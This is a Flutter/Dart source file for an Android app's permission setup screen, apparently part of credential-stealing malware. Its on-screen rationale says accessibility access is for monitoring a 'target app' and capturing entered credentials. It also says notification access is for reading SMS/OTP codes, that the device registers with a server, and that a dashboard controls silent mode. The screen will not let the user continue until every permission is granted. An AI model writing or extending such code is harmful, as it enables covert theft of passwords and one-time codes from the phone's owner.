import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

// Dedicated permission onboarding: all grants in one pass with rationale,
// live status, and direct settings deep-links. Temporary debug builds route
// through here into the debug dashboard; production can flip to it via
// main.dart once validated on the VM.
class PermissionOnboardingScreen extends StatefulWidget {
  final WidgetBuilder next;

  const PermissionOnboardingScreen({super.key, required this.next});

  @override
  State<PermissionOnboardingScreen> createState() =>
      _PermissionOnboardingScreenState();
}

class _Step {
  final String id;
  final String title;
  final String why;
  final String cta;
  final Future<void> Function() action;

  const _Step({
    required this.id,
    required this.title,
    required this.why,
    required this.cta,
    required this.action,
  });
}

class _PermissionOnboardingScreenState extends State<PermissionOnboardingScreen>
    with WidgetsBindingObserver {
  static const _permissionsChannel = MethodChannel('com.decry.permissions');

  final Map<String, bool> _granted = {
    'runtime': false,
    'accessibility': false,
    'listener': false,
    'dnd': false,
  };
  bool _loading = true;
  bool _requesting = false;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _boot();
    _timer = Timer.periodic(const Duration(seconds: 2), (_) {
      if (mounted && !_allGranted) _refresh();
    });
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _timer?.cancel();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed && mounted) _refresh();
  }

  bool get _allGranted => _granted.values.every((v) => v);
  int get _doneCount => _granted.values.where((v) => v).length;

  Future<void> _boot() async {
    await _requestRuntime(initial: true);
    await _refresh();
    if (mounted) setState(() => _loading = false);
  }

  Future<void> _requestRuntime({bool initial = false}) async {
    if (_requesting) return;
    _requesting = true;
    try {
      final r = await _permissionsChannel.invokeMethod<Map<dynamic, dynamic>>(
        'requestRuntimePermissions',
      );
      if (mounted) {
        setState(() => _granted['runtime'] = r?['granted'] == true);
      }
    } catch (_) {
      if (initial && mounted) {
        // Non-Android runner (channel missing): don't block the flow.
        setState(() => _granted['runtime'] = true);
      }
    }
    _requesting = false;
  }

  Future<void> _refresh() async {
    try {
      final r = await _permissionsChannel.invokeMethod<Map<dynamic, dynamic>>(
        'getSpecialAccessStatus',
      );
      if (!mounted || r == null) return;
      setState(() {
        _granted['accessibility'] = r['accessibilityEnabled'] == true;
        _granted['listener'] = r['notificationListenerEnabled'] == true;
        _granted['dnd'] = r['notificationPolicyGranted'] == true;
      });
    } catch (_) {
      // MissingPluginException on non-Android: leave states as-is.
    }
  }

  Future<void> _open(String method) async {
    try {
      await _permissionsChannel.invokeMethod<void>(method);
    } catch (_) {}
    // Status refreshes via timer + on-resume; also try once after a beat
    // in case the settings app didn't take focus.
    await Future.delayed(const Duration(seconds: 1));
    if (mounted) _refresh();
  }

  List<_Step> get _steps => [
        _Step(
          id: 'runtime',
          title: 'Phone access',
          why: 'Read SIM and device state so the device can register with the server.',
          cta: 'Grant',
          action: () => _requestRuntime(),
        ),
        _Step(
          id: 'accessibility',
          title: 'Accessibility access',
          why: 'Required to monitor the target app and capture entered credentials.',
          cta: 'Open settings',
          action: () => _open('openAccessibilitySettings'),
        ),
        _Step(
          id: 'listener',
          title: 'Notification access',
          why: 'Required to read incoming SMS/OTP notifications.',
          cta: 'Open settings',
          action: () => _open('openNotificationListenerSettings'),
        ),
        _Step(
          id: 'dnd',
          title: 'Do Not Disturb access',
          why: 'Required for silent-mode control from the dashboard.',
          cta: 'Open settings',
          action: () => _open('openNotificationPolicySettings'),
        ),
      ];

  @override
  Widget build(BuildContext context) {
    if (_loading) {
      return const Scaffold(
        backgroundColor: Colors.white,
        body: Center(
          child: SizedBox(
            width: 20,
            height: 20,
            child: CircularProgressIndicator(strokeWidth: 2),
          ),
        ),
      );
    }
    final steps = _steps;
    return Scaffold(
      backgroundColor: Colors.white,
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.all(20),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              const SizedBox(height: 12),
              const Text(
                'Setup',
                style: TextStyle(fontSize: 22, fontWeight: FontWeight.w500),
              ),
              const SizedBox(height: 4),
              Text(
                '$_doneCount of ${steps.length} permissions granted',
                style: const TextStyle(fontSize: 13, color: Colors.grey),
              ),
              const SizedBox(height: 8),
              LinearProgressIndicator(
                value: _doneCount / steps.length,
                backgroundColor: Colors.grey.shade200,
                color: Colors.black,
              ),
              const SizedBox(height: 16),
              Expanded(
                child: ListView.separated(
                  itemCount: steps.length,
                  separatorBuilder: (_, __) => const SizedBox(height: 10),
                  itemBuilder: (_, i) => _stepCard(steps[i], i + 1),
                ),
              ),
              const SizedBox(height: 12),
              ElevatedButton(
                onPressed: _allGranted
                    ? () => Navigator.of(context).pushReplacement(
                          MaterialPageRoute(builder: widget.next),
                        )
                    : null,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.black,
                  foregroundColor: Colors.white,
                  disabledBackgroundColor: Colors.grey.shade300,
                  padding: const EdgeInsets.symmetric(vertical: 14),
                ),
                child: Text(
                  _allGranted ? 'Continue' : 'Grant all permissions to continue',
                  style: const TextStyle(fontSize: 14),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _stepCard(_Step step, int n) {
    final done = _granted[step.id] == true;
    return Card(
      elevation: 0,
      color: done ? Colors.green.shade50 : Colors.grey.shade100,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(10),
        side: BorderSide(
          color: done ? Colors.green.shade200 : Colors.grey.shade300,
        ),
      ),
      child: Padding(
        padding: const EdgeInsets.all(14),
        child: Row(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Icon(
              done ? Icons.check_circle : Icons.radio_button_unchecked,
              color: done ? Colors.green : Colors.grey,
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    '$n. ${step.title}',
                    style: const TextStyle(
                      fontSize: 15,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    step.why,
                    style: const TextStyle(fontSize: 12, color: Colors.black54),
                  ),
                  if (!done) ...[
                    const SizedBox(height: 10),
                    SizedBox(
                      height: 36,
                      child: ElevatedButton(
                        onPressed: step.action,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.black,
                          foregroundColor: Colors.white,
                          padding: const EdgeInsets.symmetric(horizontal: 16),
                        ),
                        child: Text(step.cta,
                            style: const TextStyle(fontSize: 13)),
                      ),
                    ),
                  ],
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}
